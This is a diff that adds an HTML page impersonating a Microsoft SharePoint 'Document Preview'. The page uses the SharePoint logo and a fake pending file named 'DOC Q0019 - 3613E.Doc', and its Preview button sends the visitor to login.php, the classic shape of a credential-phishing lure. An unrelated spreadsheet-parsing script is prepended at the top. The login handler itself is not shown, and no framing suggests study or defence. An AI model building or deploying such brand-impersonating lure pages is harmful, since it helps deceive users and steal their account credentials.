@@ -1,0 +1,143 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SharePoint - Document Preview</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            height: 100vh;
+            overflow: hidden;
+        }
+        @media (min-width: 768px) {
+            body {
+                background-size: cover;
+                background-position: center;
+            }
+        }
+        @media (max-width: 767px) {
+            body {
+                padding: 10px;
+            }
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            background: linear-gradient(to right, #005a9e, #000);
+            color: white;
+            padding: 10px 20px;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+        }
+        .header img {
+            width: 24px;
+            margin-right: 10px;
+        }
+        .header .title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .header .doc-name {
+            font-size: 16px;
+            flex-grow: 1;
+        }
+        .content {
+            padding: 20px;
+            text-align: center;
+        }
+        .file-info {
+            margin: 20px 0;
+        }
+        .file-info img {
+            width: 80px;
+            margin-bottom: 10px;
+        }
+        .file-info p {
+            margin: 5px 0;
+            color: #333;
+            font-size: 14px;
+        }
+        .preview-btn {
+            padding: 10px 20px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .preview-btn:hover {
+            background-color: #005a9e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg/1049px-Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg.png" alt="SharePoint Logo" style="width: 24px; height: 24px; margin-right: 10px;">
+            <span class="title">SharePoint</span>
+            <span class="doc-name" id="file-name">DOC Q0019 - 3613E.Doc</span>
+        </div>
+        <div class="content">
+            <p>You have one pending document on SharePoint for download</p>
+            <p>DOC Q0019 - 3613E.Doc (0.93MB)</p>
+            <div class="file-info">
+                <img id="file-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg/1049px-Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg.png" alt="File Icon" style="width: 80px; height: 80px;">
+            </div>
+            <button class="preview-btn" onclick="window.location.href='login.php'">Preview</button>
+        </div>
+    </div>
+</body>
+</html>
